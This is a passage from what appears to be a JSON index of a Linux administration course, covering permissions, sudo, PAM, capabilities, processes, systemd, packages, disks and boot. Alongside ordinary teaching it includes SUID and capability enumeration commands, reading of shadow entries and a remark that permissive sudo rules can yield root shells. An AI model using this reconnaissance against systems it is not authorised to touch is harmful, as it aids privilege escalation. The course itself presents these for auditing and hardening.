Using cat on a multi-gigabyte log. Forgetting that grep patterns are regular expressions unless you use -F. Running uniq without sorting first. Checkpoint You should now be able to: Read short and long files with the right tool. Search logs and configuration with grep. Build a multi-stage pipeline. Redirect output and keep a copy with tee. Make a safe edit with nano or vim. Next you will learn how Linux decides who can read, write and execute those files."},{"kind":"foundation","number":5,"order":105,"href":"foundations/05-users-permissions-sudo.html","slug":"05-users-permissions-sudo","page":"05-users-permissions-sudo.html","title":"Users, Permissions and Sudo","short":"Users and sudo","summary":"Read UIDs, groups, modes, ACLs and sudo rules, then change access with intent.","part":"foundations","partNum":"HF","partName":"Linux Foundations","readMinutes":17,"words":2180,"sections":20,"codeBlocks":30,"headings":[{"id":"identities","text":"Identities","level":2},{"id":"permission-bits","text":"Permission bits","level":2},{"id":"octal-notation","text":"Octal notation","level":2},{"id":"change-ownership","text":"Change ownership","level":2},{"id":"the-umask","text":"The umask","level":2},{"id":"special-bits","text":"Special bits","level":2},{"id":"access-control-lists","text":"Access control lists","level":2},{"id":"sudo","text":"Sudo","level":2},{"id":"service-accounts","text":"Service accounts","level":2},{"id":"account-databases-and-the-login-flow","text":"Account databases and the login flow","level":2},{"id":"manage-users-and-groups","text":"Manage users and groups","level":2},{"id":"pam-in-one-page","text":"PAM in one page","level":2},{"id":"capabilities","text":"Capabilities","level":2},{"id":"security-modules","text":"Security modules","level":2},{"id":"ssh-key-permissions","text":"SSH key permissions","level":2},{"id":"sudo-in-more-detail","text":"Sudo in more detail","level":2},{"id":"password-hashes-and-shadow-fields","text":"Password hashes and shadow fields","level":2},{"id":"lab-inspect-and-adjust-a-sandbox","text":"Lab: inspect and adjust a sandbox","level":2},{"id":"common-mistakes","text":"Common mistakes","level":2},{"id":"checkpoint","text":"Checkpoint","level":2}],"text":"Linux is a multi-user system. Every process has an identity, and every file has an owner, a group and a mode. The kernel uses those facts to decide whether an operation is allowed. This part teaches you to read that decision and change it deliberately. Identities A user account has a username, a numeric user ID, a primary group and usually a home directory and login shell. id whoami groups getent passwd \"$USER\" The account database is /etc/passwd. Each line has seven colon-separated fields: name:password:UID:GID:GECOS:home:shell The password field is usually x, which means the hash is stored in /etc/shadow. Only privileged processes should read the shadow file. Groups are defined in /etc/group. A user can belong to one primary group and many supplementary groups. Group membership is a convenient way to grant access to several users at once. getent group sudo getent group docker Permission bits A long listing shows the mode, owner and group: -rw-r----- 1 alice analysts 1200 Jan 10 12:00 report.txt The first character is the file type. The next nine characters are three sets of three permissions: owner group other rw- r-- --- Each set can contain: Symbol Meaning for a file Meaning for a directory r Read contents List names w Change contents Create, delete and rename entries x Execute the file Enter the directory and access entries The execute bit on a directory is easy to miss. Without x, you cannot cd into it or access files by path, even if you can list its names. Octal notation Each permission set is a number from 0 to 7: Value Permissions 0 --- 1 --x 2 -w- 3 -wx 4 r-- 5 r-x 6 rw- 7 rwx So 755 means rwxr-xr-x, and 640 means rw-r-----. chmod 640 report.txt chmod 750 scripts chmod u+x backup.sh chmod g-w report.txt chmod o-r report.txt chmod accepts octal modes and symbolic modes. Symbolic modes use u for owner, g for group, o for other and a for all. + adds, - removes and = sets exactly. Change ownership sudo chown alice report.txt sudo chown alice:analysts report.txt sudo chgrp analysts report.txt Only root can give a file to another user. A normal user can change the group of a file only to a group they belong to, and only if the filesystem allows it. chown -R recurses, so use it carefully. The umask When a process creates a file, the kernel starts from a default mode and removes the bits in the umask. A common umask is 022: Files start at 666, so 666 minus 022 gives 644. Directories start at 777, so 777 minus 022 gives 755. umask umask 027 A umask of 027 gives files 640 and directories 750 by default. Set it in a shell startup file or a service definition when the default is too open. Special bits Three special bits change normal permission behavior: Bit Name Effect 4000 SUID Program runs with the file owner's effective UID 2000 SGID Program runs with the file group, or a directory inherits its group 1000 Sticky Only the file owner, directory owner or root can delete entries find / -perm -4000 -type f 2>/dev/null find / -perm -2000 -type f 2>/dev/null ls -ld /tmp SUID binaries are a normal part of many systems, but unexpected SUID files are worth investigating. Do not remove a special bit from a system binary without understanding what depends on it. Access control lists The classic mode has only one owner and one group. Access control lists, or ACLs, allow more specific grants. getfacl report.txt setfacl -m u:bob:r report.txt setfacl -m g:analysts:rw report.txt setfacl -x u:bob report.txt The + in a long listing indicates that a file has an ACL. Use getfacl before changing ACLs so you can see the existing entries. Sudo sudo runs a command as another user, usually root, according to a policy in /etc/sudoers and /etc/sudoers.d. sudo -l sudo -u www-data id sudo systemctl status ssh sudo -l lists what your account is allowed to run. Read it carefully. A rule that allows a broad command can be equivalent to full root access, even if it looks limited. Edit sudo policy with visudo, which checks syntax before saving: sudo visudo A simple rule looks like this: alice ALL=(ALL:ALL) ALL That gives Alice full sudo access. A narrower rule might allow only one command: alice ALL=(root) /usr/bin/systemctl restart nginx Even narrow rules need review. Some commands can start shells, edit arbitrary files or load configuration that runs as root. Treat sudo policy as security-sensitive code. Service accounts Many services run as dedicated users such as www-data, postgres or nginx. These accounts usually have no login shell and no password. They exist to limit the damage if the service is compromised. getent passwd www-data ps -o user,pid,cmd -C nginx Do not run a network service as root unless the service genuinely needs it and you have reviewed the design. Account databases and the login flow Linux stores account information in a small set of text databases. The most important are: File Contents /etc/passwd Username, UID, GID, description, home directory and shell /etc/shadow Password hashes and password aging, readable by root only /etc/group Group names, GIDs and member lists /etc/gshadow Group passwords and administrators, readable by root only /etc/login.defs Defaults for UID ranges, password aging and creation /etc/skel/ Template files copied into new home directories /etc/nsswitch.conf Which sources provide users, groups, hosts and other names A simplified local login looks like this: getty or a display manager presents a login prompt. The login program collects a username and password. PAM, the Pluggable Authentication Modules framework, runs the configured checks. The system verifies the password hash in /etc/shadow or delegates to another source. The login program sets the user and group identity, home directory and environment. The user's login shell starts. SSH logins follow a similar path. sshd authenticates the user, then starts the shell or the requested command. PAM policy can apply account restrictions, password quality rules, session limits and audit hooks. Inspect your own entry and the resolved account data: getent passwd \"$USER\" getent group \"$(id -gn)\" getent shadow \"$USER\" lastlog -u \"$USER\" Only root can read /etc/shadow. getent asks the name service switch, so it works with local files, LDAP or other sources. Reading /etc/passwd directly only shows the local file. Manage users and groups On Debian and Ubuntu, adduser is a friendly wrapper around useradd. On other distributions, useradd is the standard low-level tool. sudo adduser alice sudo useradd -m -s /bin/bash bob sudo passwd bob sudo usermod -aG sudo bob sudo usermod -s /bin/zsh bob sudo userdel -r bob Task Command Create a user adduser alice or useradd -m alice Set a password passwd alice Add a supplementary group usermod -aG group user Change the login shell usermod -s /bin/bash user Lock an account usermod -L user or passwd -l user Unlock an account usermod -U user or passwd -u user Delete a user userdel -r user Create a group groupadd project Add a member to a group gpasswd -a user project Remove a member gpasswd -d user project Be careful with usermod -G. Without -a, it replaces the user's supplementary groups instead of adding one. The safe form is usermod -aG group user. Password aging is controlled with chage: sudo chage -l alice sudo chage -M 90 -W 14 alice -M sets the maximum password age in days. -W sets the warning period. Password policy belongs in a documented standard, not only in one account's settings. PAM in one page PAM sits between an application and the authentication mechanism. Applications such as login, sshd, su and sudo include PAM support. The rules live in /etc/pam.d/. ls /etc/pam.d cat /etc/pam.d/common-auth cat /etc/pam.d/sshd A PAM line has four fields: type, control, module and arguments. type control module-path arguments auth required pam_unix.so Common types are auth for authentication, account for account validity, password for password changes and session for session setup. Common controls are required, requisite, sufficient and optional. PAM is powerful and easy to break. A mistake in /etc/pam.d/common-auth can lock every account out, including root. Keep a root shell open, make a backup and test in a disposable lab before changing authentication policy. Capabilities Capabilities split root's power into smaller privileges. Instead of making a program SUID root, you can grant only the capability it needs. getcap -r / 2>/dev/null getpcaps $$ capsh --print sudo setcap cap_net_bind_service=+ep /usr/local/bin/myserver sudo getcap /usr/local/bin/myserver sudo setcap -r /usr/local/bin/myserver cap_net_bind_service allows a program to bind to a privileged port below 1024. cap_net_raw allows raw sockets. cap_dac_override bypasses file read, write and execute permission checks, so it is close to root for many purposes. Capabilities are stored in extended attributes. They can be lost when a file is copied or replaced by a package upgrade. Treat an unexpected capability as a finding worth investigating. Security modules Mandatory access control adds policy on top of the classic permission bits. The two common Linux implementations are SELinux and AppArmor. SELinux is common on Red Hat family systems. It labels files and processes and enforces type-based rules. getenforce sestatus ls -Z /var/www/html ps -eZ | head sudo ausearch -m avc -ts recent AppArmor is common on Ubuntu and SUSE. It applies profiles to programs. sudo aa-status sudo aa-enforce /etc/apparmor.d/usr.bin.example sudo aa-complain /etc/apparmor.d/usr.bin.example Check which system your lab uses before changing policy. Disabling a security module to make one application work is usually the wrong fix. Write or adjust a profile instead. SSH key permissions SSH is strict about private key and configuration permissions. A private key that other users can read is rejected. chmod 700 ~/.ssh chmod 600 ~/.ssh/id_ed25519 chmod 644 ~/.ssh/id_ed25519.pub chmod 600 ~/.ssh/authorized_keys chmod 600 ~/.ssh/config The public key can be world-readable. The private key must not be. The .ssh directory should not be writable by anyone else. These rules apply to the account that owns the files, not to the client alone. Sudo in more detail sudo caches an authentication timestamp for a short period. Use sudo -k to clear it and sudo -v to refresh it without running a command. sudo -k sudo -v sudo -l sudo -u www-data id sudo -i sudo -i starts a login shell as root. sudo -u runs a command as another user. sudo -l lists allowed commands. On some systems, a user may be allowed to run sudo -l but not to read the full policy. Prefer files in /etc/sudoers.d/ over editing /etc/sudoers directly. Always use visudo -f to validate syntax: sudo visudo -f /etc/sudoers.d/lab A rule that permits a text editor, a pager, a package manager, a scripting language or a service manager can often be turned into a full shell. Review sudo rules as code, not as a convenience list. Password hashes and shadow fields Password hashes belong in /etc/shadow, not in /etc/passwd. A shadow line has nine colon-separated fields: name:hash:lastchange:min:max:warn:inactive:expire:reserved Field Meaning name Username hash Password hash, ! or * for a locked account, or an empty field for no password lastchange Days since 1970-01-01 when the password last changed min Minimum days before a password can be changed max Maximum days before a password must be changed warn Days before expiry to warn the user inactive Days after expiry before the account is disabled expire Account expiration date in days since 1970-01-01 reserved Reserved for future use A modern hash looks like $6$... for SHA-512 or $y$... for yescrypt. The prefix identifies the algorithm, and the rest includes a salt and the digest. Hashes are one-way functions, but weak passwords can still be guessed offline. That is why password length, uniqueness and rate limiting matter. Check password status without revealing the hash: sudo passwd -S alice sudo chage -l alice passwd -S shows whether the password is set, locked or empty, and the last change date. chage -l shows the aging policy. Generate a hash for a lab account only when you have a reason: openssl passwd -6 mkpasswd -m yescrypt Do not paste real password hashes into tickets, chat or notes. Treat the shadow file as sensitive. Restrict backups that contain it and encrypt them. Lab: inspect and adjust a sandbox mkdir -p ~/linux-foundations/lab05 cd ~/linux-foundations/lab05 printf 'sensitive lab data\\n' > secret.txt chmod 600 secret.txt ls -l secret.txt stat secret.txt umask Then: Create a group called labteam if you have sudo access. Add your user to the group. Change the file group to labteam. Set the mode to 640. Use getfacl to inspect it. Explain why another normal user still cannot read it. Common mistakes Using chmod 777 to solve an access problem. Forgetting that directory execute permission is required to access files inside. Running chown -R on the wrong path. Editing /etc/sudoers directly instead of using visudo. Assuming a service account is harmless because it cannot log in. Checkpoint You should now be able to: Read UIDs, GIDs and group membership. Interpret symbolic and octal modes. Change ownership and permissions safely. Explain SUID, SGID and the sticky bit. Inspect sudo rights and understand why broad rules are dangerous. Next you will look at the processes and services that use these permissions."},{"kind":"foundation","number":6,"order":106,"href":"foundations/06-processes-services-systemd.html","slug":"06-processes-services-systemd","page":"06-processes-services-systemd.html","title":"Processes, Services and systemd","short":"Processes and systemd","summary":"Inspect processes, manage jobs, send signals and control services with systemd.","part":"foundations","partNum":"HF","partName":"Linux Foundations","readMinutes":20,"words":2395,"sections":19,"codeBlocks":36,"headings":[{"id":"the-process-model","text":"The process model","level":2},{"id":"inspect-resource-use","text":"Inspect resource use","level":2},{"id":"jobs-in-an-interactive-shell","text":"Jobs in an interactive shell","level":2},{"id":"signals","text":"Signals","level":2},{"id":"process-control-quick-reference","text":"Process control quick reference","level":2},{"id":"the-proc-filesystem","text":"The /proc filesystem","level":2},{"id":"systemd-services","text":"systemd services","level":2},{"id":"read-service-logs","text":"Read service logs","level":2},{"id":"unit-files","text":"Unit files","level":2},{"id":"process-lifecycle-and-exit-status","text":"Process lifecycle and exit status","level":2},{"id":"resource-limits-and-cgroups","text":"Resource limits and cgroups","level":2},{"id":"process-inspection-tools","text":"Process inspection tools","level":2},{"id":"nice-values-and-scheduling","text":"Nice values and scheduling","level":2},{"id":"timers-and-targets","text":"Timers and targets","level":2},{"id":"service-hardening","text":"Service hardening","level":2},{"id":"kernel-modules-and-sysctl","text":"Kernel modules and sysctl","level":2},{"id":"lab-observe-a-service","text":"Lab: observe a service","level":2},{"id":"common-mistakes","text":"Common mistakes","level":2},{"id":"checkpoint","text":"Checkpoint","level":2}],"text":"A running Linux system is a moving collection of processes. Some are short commands you start in a terminal. Others are long-lived services that start at boot and wait for work. Understanding both is essential for troubleshooting and for reading a system accurately. The process model Every process has: A process ID, or PID. A parent process ID, or PPID. A user and group identity. A state, such as running, sleeping or stopped. Memory, open files and environment variables. A current working directory. The first process started by the kernel is usually PID 1. On most modern distributions, PID 1 is systemd. It starts and supervises other services. A process tree shows how everything descends from PID 1. ps -ef ps aux ps -o pid,ppid,user,stat,cmd -p $$ pstree -p $$ is the PID of the current shell. The STAT column shows the process state. Common values include R for running, S for sleeping, D for uninterruptible sleep, T for stopped and Z for zombie. Inspect resource use top htop uptime free -h vmstat 1 top and htop show CPU, memory and process activity. uptime shows load averages for the last one, five and fifteen minutes. Load is not the same as CPU percentage: it counts runnable and uninterruptible tasks. A high load with low CPU use can mean storage or I/O is stalled. free -h shows memory and swap. Linux uses free memory for cache, so \"free\" being low is not automatically a problem. Look at available memory and swap activity. Inside top, press k to send a signal, r to renice a process and q to quit. htop exposes the same actions through function keys and a menu. Jobs in an interactive shell A job is a command started from your shell. You can move it between the foreground and background. sleep 300 Press Ctrl+Z to suspend it. Then: jobs bg %1 fg %1 bg continues the job in the background. fg brings it back to the foreground. A command started with & goes directly to the background: sleep 300 & jobs Background jobs still belong to the shell. If the shell exits, they may receive a hangup signal. Use nohup or a service manager for work that must survive logout. Signals A signal is an asynchronous notification. The kill command sends signals, despite its name. kill -l kill -TERM 1234 kill -INT 1234 kill -KILL 1234 Signal Common meaning SIGTERM Request termination; the process can clean up SIGINT Interrupt, usually from Ctrl+C SIGHUP Hangup or reload, depending on the program SIGKILL Force termination; cannot be caught SIGSTOP Stop the process; cannot be caught SIGCONT Continue a stopped process Start with SIGTERM. Give the process time to exit. Use SIGKILL only when a process is stuck and you understand the consequences. A killed database or editor can lose data. Find and signal processes by name: pgrep -a ssh pkill -TERM -f 'python3 worker.py' pkill -f matches the full command line. Check the matches with pgrep -af first so you do not kill the wrong process. Process control quick reference Use this table when you know the task but not the command. Task Command List every process ps -ef or ps aux Show one user's processes ps -u alice Show a process by name ps -C nginx -o pid,cmd Find a process by name pgrep -a nginx or pidof nginx Show the process tree pstree -p Watch live resource use top or htop Send a signal kill -TERM PID Signal by name pkill -TERM nginx or killall nginx Stop and resume kill -STOP PID, then kill -CONT PID Wait for a child wait PID Run in the background command & Keep running after logout nohup command > log 2>&1 & Remove a job from the shell table disown %1 Limit runtime timeout 30s command Repeat a command watch -n 2 command Change priority nice -n 10 command, renice 10 -p PID Examples: pgrep -af 'python.*worker' kill -TERM \"$(pgrep -f 'python.*worker')\" timeout 10s ping -c 1 example.com watch -n 2 'ss -tulpn' nohup ./backup.sh > backup.log 2>&1 & disown killall matches process names and is not available on every system. pkill -f matches the full command line, so verify the matches with pgrep -af first. wait only works for children of the current shell. disown removes a job from the shell's job table so the shell does not send it a hangup signal when it exits. It does not make a badly behaved program into a service. Use systemd for anything that must survive reboots and be monitored. The /proc filesystem /proc exposes process and kernel information as a virtual filesystem. ls /proc/$$ cat /proc/$$/status cat /proc/$$/cmdline | tr '\\0' ' ' ls -l /proc/$$/cwd ls -l /proc/$$/fd The fd directory lists open file descriptors. The cwd link points to the current working directory. These views are generated by the kernel and change as the process changes. systemd services A service is a long-running program managed by an init system. systemd uses unit files to describe services, sockets, timers, mounts and targets. systemctl status ssh systemctl is-enabled ssh systemctl is-active ssh systemctl list-units --type=service --state=running systemctl list-unit-files --type=service Common actions: sudo systemctl start nginx sudo systemctl stop nginx sudo systemctl restart nginx sudo systemctl reload nginx sudo systemctl enable nginx sudo systemctl disable nginx start changes the current state. enable changes whether the service starts at boot. They are separate decisions. reload asks the service to reread its configuration without a full restart, but not every service supports it. Read service logs systemd captures service output in the journal. journalctl -u ssh --no-pager journalctl -u ssh -n 50 --no-pager journalctl -u ssh --since '1 hour ago' journalctl -u ssh -f -u selects a unit. -n limits the number of lines. --since filters by time. -f follows new entries. If the journal is not persistent across reboots, check /etc/systemd/journald.conf. Unit files System and package unit files usually live in /usr/lib/systemd/system. Local administrator overrides belong in /etc/systemd/system. Do not edit package-owned files directly if you can use an override. systemctl cat ssh systemctl show ssh -p FragmentPath,ExecStart,User A minimal service unit looks like this: [Unit] Description=Example worker After=network.target [Service] Type=simple User=worker WorkingDirectory=/opt/example ExecStart=/opt/example/worker Restart=on-failure [Install] WantedBy=multi-user.target After creating or changing a unit: sudo systemctl daemon-reload sudo systemctl restart example systemctl status example daemon-reload rereads unit files. It does not restart services by itself. Process lifecycle and exit status A process starts when another process creates it. On Linux, the usual sequence is: The parent calls fork or clone to create a child. The child calls execve to replace its memory image with a new program. The program runs and eventually calls exit with a status. The parent calls wait or waitpid to collect the status. A process that has exited but whose parent has not collected its status is a zombie. It uses a process table slot but no CPU or memory. A zombie is not a sign of a runaway process. It is a sign that the parent is not reaping children. If a service leaves many zombies, investigate the service, not the zombies. An orphan is a process whose parent exited first. It is adopted by PID 1 or by a subreaper, which is responsible for reaping it. Inspect process states and parentage: ps -eo pid,ppid,stat,user,comm --sort=ppid ps -eo stat,comm | awk '$1 ~ /^Z/ {print}' pstree -ap The STAT field uses codes such as R for running, S for interruptible sleep, D for uninterruptible sleep, T for stopped, Z for zombie and I for idle kernel thread. A process in D state is usually waiting on I/O and cannot be killed until the I/O completes. Exit status is a small integer from 0 to 255. Zero means success. The meaning of non-zero values is defined by the program. Shells expose the last status through $?. ls /etc/passwd printf 'status=%s\\n' \"$?\" ls /does-not-exist printf 'status=%s\\n' \"$?\" A pipeline reports the status of its last command unless pipefail is enabled. That detail matters in scripts. Resource limits and cgroups Traditional Unix limits are set per process with ulimit or prlimit. ulimit -a ulimit -n ulimit -u prlimit --pid $$ prlimit --pid $$ --nofile=4096 ulimit -n is the open file descriptor limit. ulimit -u is the process limit. A shell can lower limits for its children, but raising a hard limit usually requires privilege. Systemd services can set limits in their unit files. Control groups, or cgroups, organize processes and account for or limit resources. systemd uses cgroups to track services, slices and user sessions. systemd-cgls systemd-cgtop cat /proc/$$/cgroup systemd-cgls shows the cgroup tree. systemd-cgtop shows resource use by cgroup. On a modern system, the cgroup version is usually v2, mounted at /sys/fs/cgroup. A systemd unit can set resource controls: [Service] MemoryMax=512M CPUQuota=50% TasksMax=100 These limits apply to the service's cgroup. They are more reliable than a shell ulimit for long-running services. Process inspection tools ps and top are the starting point. The following tools answer more specific questions. Tool Question pgrep Which PIDs match a name or pattern? pstree How are processes related? lsof Which files, sockets and devices does a process have open? fuser Which process is using this file, mount or port? strace Which system calls is a process making? ltrace Which library calls is a process making? pidstat How much CPU, memory and I/O is each process using over time? iostat How busy are the block devices? iotop Which processes are doing disk I/O? Examples: pgrep -a ssh lsof -p $$ lsof -i :22 fuser -v /var/log/syslog strace -p 1234 -f -e trace=file strace -c ls / strace can slow a process significantly and may be blocked by security policy. Use it for short diagnostic sessions. lsof -i :22 shows processes with a socket on port 22. fuser is useful before unmounting a filesystem. The /proc filesystem exposes per-process state: cat /proc/$$/status cat /proc/$$/limits cat /proc/$$/environ | tr '\\0' '\\n' ls -l /proc/$$/fd readlink /proc/$$/exe These files are generated by the kernel. Reading another user's process information may be restricted by hidepid mount options or security modules. Nice values and scheduling The scheduler decides which runnable process gets CPU time. Nice values influence that decision. The range is usually -20 to 19. Lower values mean higher priority. Only root can set negative values. nice -n 10 command renice 10 -p 1234 ionice -c 2 -n 7 -p 1234 ionice adjusts I/O priority on supported schedulers. It is not a guarantee. A process can still wait on a slow disk. Do not use renice to fix a design problem. If a service is consistently starving others, investigate its workload, limits and concurrency. Timers and targets systemd timers schedule work without cron. A timer unit activates a service unit. systemctl list-timers --all systemctl status apt-daily.timer systemctl cat apt-daily.timer A simple pair looks like this: # /etc/systemd/system/lab-report.timer [Unit] Description=Run the lab report daily [Timer] OnCalendar=daily Persistent=true [Install] WantedBy=timers.target # /etc/systemd/system/lab-report.service [Unit] Description=Build the lab report [Service] Type=oneshot ExecStart=/usr/local/bin/lab-report.sh Enable and start the timer: sudo systemctl daemon-reload sudo systemctl enable --now lab-report.timer systemctl list-timers lab-report.timer journalctl -u lab-report.service --no-pager Persistent=true runs a missed job after the machine boots. OnCalendar=daily is a simple schedule. Use systemd-analyze calendar to test expressions. Targets group units into states. The default target is roughly the old runlevel. systemctl get-default systemctl list-units --type=target systemctl isolate multi-user.target systemctl isolate graphical.target Do not isolate targets on a remote system unless you understand which services will stop. Service hardening systemd can restrict a service even if the application has no sandbox of its own. [Service] User=app Group=app NoNewPrivileges=true PrivateTmp=true ProtectSystem=strict ProtectHome=true ReadWritePaths=/var/lib/app ProtectKernelTunables=true ProtectKernelModules=true ProtectControlGroups=true RestrictAddressFamilies=AF_UNIX AF_INET AF_INET6 These options are not universal. Some applications need access to /home, raw sockets or kernel interfaces. Add restrictions one at a time, restart the service and test. A service that starts is not necessarily a service that works. Inspect the effective sandbox: systemctl show app -p User -p Group -p NoNewPrivileges -p ProtectSystem systemd-analyze security app systemd-analyze security gives a rough exposure score and explains which directives are missing. Use it as a prompt for review, not as a compliance certificate. Kernel modules and sysctl The kernel can load code at runtime as modules. Drivers, filesystems and networking features are often modules. lsmod modinfo ext4 modinfo -p e1000e sudo modprobe dummy lsmod | grep dummy sudo modprobe -r dummy lsmod shows loaded modules and their reference counts. modinfo shows metadata and parameters. modprobe loads a module and its dependencies. modprobe -r removes it if nothing is using it. Persistent module configuration belongs in /etc/modules-load.d/ and /etc/modprobe.d/. cat /etc/modules-load.d/*.conf ls /etc/modprobe.d A file in modules-load.d lists modules to load at boot. A file in modprobe.d sets options or blacklists a module. Do not unload a storage or network module on a live system. The device may stop working immediately. Kernel tunables are exposed through sysctl. sysctl -a sysctl net.ipv4.ip_forward sysctl vm.swappiness sudo sysctl -w net.ipv4.ip_forward=1 sysctl -a lists every tunable and can be very long. Query one key at a time. A change with -w lasts until reboot. Persistent settings belong in /etc/sysctl.d/. # /etc/sysctl.d/99-lab.conf net.ipv4.ip_forward = 1 vm.swappiness = 10 Apply and verify: sudo sysctl --system sysctl net.ipv4.ip_forward A tunable can improve one workload and harm another. Change one value, measure, and document why. Kernel hardening guides often set many values at once; understand each one before copying a list. Lab: observe a service systemctl status ssh --no-pager journalctl -u ssh -n 20 --no-pager ps -o pid,ppid,user,stat,cmd -C sshd Then answer: Is the SSH service active and enabled? Which user owns the SSH daemon processes? What is the parent PID of the daemon? Which log entries appeared most recently? What happens to the service state if you run sudo systemctl stop ssh in a disposable lab? Do not stop SSH on a remote machine unless you have another way to regain access. Common mistakes Using kill -9 as a first response. Confusing start with enable. Editing a package unit file instead of creating an override. Forgetting daemon-reload after changing a unit. Assuming a process is healthy because it is running. Checkpoint You should now be able to: Read a process tree and process states. Inspect CPU, memory and load. Manage foreground and background jobs. Send the right signal for the situation. Inspect, start, enable and troubleshoot a systemd service. Next you will manage software, storage and the boot process."},{"kind":"foundation","number":7,"order":107,"href":"foundations/07-packages-storage-boot.html","slug":"07-packages-storage-boot","page":"07-packages-storage-boot.html","title":"Packages, Storage and Boot","short":"Packages and disks","summary":"Install software, inspect disks and mounts, and understand the boot sequence.","part":"foundations","partNum":"HF","partName":"Linux Foundations","readMinutes":25,"words":3014,"sections":19,"codeBlocks":46,"headings":[{"id":"package-managers","text":"Package managers","level":2},{"id":"debian-and-ubuntu-workflow","text":"Debian and Ubuntu workflow","level":2},{"id":"repository-trust","text":"Repository trust","level":2},{"id":"inspect-disks-and-space","text":"Inspect disks and space","level":2},{"id":"mount-points-and-fstab","text":"Mount points and fstab","level":2},{"id":"swap","text":"Swap","level":2},{"id":"the-boot-sequence","text":"The boot sequence","level":2},{"id":"boot-problems","text":"Boot problems","level":2},{"id":"beyond-apt-other-package-ecosystems","text":"Beyond apt: other package ecosystems","level":2},{"id":"build-software-from-source","text":"Build software from source","level":2},{"id":"checksums-and-signatures","text":"Checksums and signatures","level":2},{"id":"partitions-filesystems-and-lvm","text":"Partitions, filesystems and LVM","level":2},{"id":"walk-through-a-new-disk","text":"Walk through a new disk","level":3},{"id":"disk-health-and-i-o-errors","text":"Disk health and I/O errors","level":2},{"id":"bootloader-initramfs-and-recovery","text":"Bootloader, initramfs and recovery","level":2},{"id":"containers-and-isolated-services","text":"Containers and isolated services","level":2},{"id":"lab-inspect-a-safe-system","text":"Lab: inspect a safe system","level":2},{"id":"common-mistakes","text":"Common mistakes","level":2},{"id":"checkpoint","text":"Checkpoint","level":2}],"text":"A Linux system is more than a kernel and a shell. It has software packages, filesystems, mount points and a boot sequence. This part gives you the working knowledge to install tools, inspect disks and understand what happens between pressing the power button and reaching a login prompt. Package managers A package manager tracks installed software, resolves dependencies, verifies signatures and records file ownership. The main families are: Family Low-level tool High-level tool Query examples Debian dpkg apt apt list --installed, dpkg -L package Red Hat rpm dnf dnf list installed, rpm -ql package Arch pacman pacman pacman -Q, pacman -Ql package SUSE rpm zypper zypper packages --installed-only The high-level tool talks to repositories, downloads packages and resolves dependencies. The low-level tool works with local package files and the package database. Debian and Ubuntu workflow sudo apt update apt search nginx apt show nginx sudo apt install nginx sudo apt upgrade sudo apt remove nginx sudo apt purge nginx sudo apt autoremove apt update refreshes the repository index. It does not upgrade installed packages. apt upgrade installs available updates. apt full-upgrade can also remove or add packages to resolve dependencies, so read the plan before confirming. Useful package queries: dpkg -l | head dpkg -L nginx dpkg -S /usr/sbin/nginx apt list --upgradable dpkg -L lists files owned by an installed package. dpkg -S finds which package owns a path. That is useful when you are deciding whether a file is safe to change. Ubuntu can install security updates automatically. unattended-upgrades is useful on servers, but it does not remove the need to read logs, test services and reboot when a kernel update requires it. sudo apt install unattended-upgrades sudo dpkg-reconfigure unattended-upgrades systemctl status unattended-upgrades Read the configuration before enabling it: cat /etc/apt/apt.conf.d/50unattended-upgrades Repository trust A package repository is configured in files under /etc/apt/sources.list and /etc/apt/sources.list.d. Each repository should have a signing key. Do not add an arbitrary repository or key just because a tutorial says so. A trusted repository can run maintainer scripts as root during installation. Before adding a third-party repository: Confirm the publisher and the exact URL. Check how the key is fetched and stored. Read the package's maintainer scripts if the source is unfamiliar. Prefer distribution packages when they are sufficient. Remove the repository when you no longer need it. Inspect disks and space lsblk lsblk -f df -h df -i du -sh /var/log du -h --max-depth=1 /var | sort -h lsblk shows block devices and their tree. df -h shows filesystem usage. df -i shows inode usage; a filesystem can be out of inodes even when it has free space. du measures directory usage. A full disk is one of the most common production failures. Check both space and inodes, then find the largest directories. Do not delete random files in /var before you know what owns them. Mount points and fstab A filesystem must be mounted before you can access its files. The kernel mounts the root filesystem during boot, then systemd or the init scripts mount the rest according to /etc/fstab. findmnt findmnt / mount cat /etc/fstab A typical fstab entry uses a UUID: UUID=1234-abcd /data ext4 defaults,noatime 0 2 The fields are: device, mount point, filesystem type, options, dump flag and fsck order. Use blkid to find UUIDs. Test fstab changes with mount -a before rebooting. A bad fstab entry can prevent the system from booting cleanly. sudo blkid sudo mkdir -p /data sudo mount /dev/sdb1 /data sudo umount /data Always unmount a filesystem before removing the device. umount fails if files are open; use lsof or fuser to find the users, then close them properly. If a filesystem was mounted read-only after an error, remount it read-write only after checking the logs and the disk: sudo mount -o remount,rw /data A remount does not repair the underlying problem. It only changes the mount flags. Swap Swap extends memory pressure handling by moving inactive pages to disk. It is not a replacement for enough RAM. swapon --show free -h cat /proc/swaps Swap can be a partition or a swap file. A swap file is easy to create on an existing filesystem: sudo fallocate -l 2G /swapfile sudo chmod 600 /swapfile sudo mkswap /swapfile sudo swapon /swapfile swapon --show free -h fallocate reserves the space, chmod 600 prevents other users from reading the file, mkswap writes the swap signature, and swapon activates it. If fallocate is not supported on the filesystem, use dd if=/dev/zero of=/swapfile bs=1M count=2048 status=progress. Make the swap file persistent by adding a line to /etc/fstab: /swapfile none swap sw 0 0 Test the entry before rebooting: sudo swapoff /swapfile sudo swapon -a swapon --show swapon -a activates all swap entries in /etc/fstab. To remove the file, disable it first: sudo swapoff /swapfile sudo rm /swapfile Then remove the /etc/fstab line. Never delete an active swap file. Check and tune swappiness: sysctl vm.swappiness sudo sysctl -w vm.swappiness=10 vm.swappiness influences how aggressively the kernel moves anonymous pages to swap. Lower values favor keeping application memory in RAM. The right value depends on the workload. Make persistent changes in /etc/sysctl.d/, not only with -w. A swap partition uses mkswap /dev/sdX and swapon /dev/sdX instead of a file. The boot sequence A simplified Linux boot sequence looks like this: Firmware initializes hardware and selects a boot device. The bootloader, often GRUB, loads the kernel and initramfs. The kernel initializes drivers and mounts the initramfs. The initramfs loads the modules needed to mount the real root filesystem. The kernel starts PID 1, usually systemd. systemd starts units until the default target is reached. A login manager or getty presents a login prompt. Useful inspection commands: systemctl get-default systemctl list-units --type=target journalctl -b --no-pager | head -n 50 journalctl -b -p err --no-pager dmesg | head -n 50 journalctl -b shows the current boot. -p err filters to error priority and above. dmesg shows the kernel ring buffer, which is useful for hardware and driver messages. Boot problems Symptom First checks Firmware does not find a boot device Boot order, disk detection, bootloader entry Kernel starts but root is not found Kernel command line, initramfs, disk UUID System reaches emergency mode fstab, failed mounts, filesystem errors Login prompt never appears Failed units, display manager, getty System boots slowly systemd-analyze, systemd-analyze blame Service fails at boot systemctl status, journalctl -u systemd-analyze systemd-analyze 